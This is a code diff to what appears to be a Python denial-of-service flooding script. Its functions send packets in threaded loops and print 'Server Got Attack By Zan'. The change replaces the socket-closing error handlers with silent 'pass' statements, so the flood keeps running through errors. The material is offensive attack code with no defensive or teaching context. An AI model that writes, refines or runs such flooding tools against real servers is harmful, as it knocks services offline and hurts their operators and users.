@@ -450,8 +450,7 @@ def start2():
                    xx += random.randint(0, int(pack))
                    print("Server Got Attack By Zan ")
             except:
-                  s.close()
-                  print("Ez Crashh")
+                  pass
                   
   return byte3
   return byte4
@@ -487,8 +486,7 @@ def spoofer4():
                s.sendall(byte7)
            print("Server Got Attack By Zan ")
         except:
-            s.close()
-            print("Ez Crashh")      
+              pass      
 
 
 def start():
@@ -515,8 +513,7 @@ def start():
                 s.send(str.encode(main_host))
             print("Server Got Attack By Zan ")
         except:
-            s.close()
-            print("Ez Crashh")
+              pass
 for i in range(th):
   th1 = threading.Thread(target=start)
   th1.start()
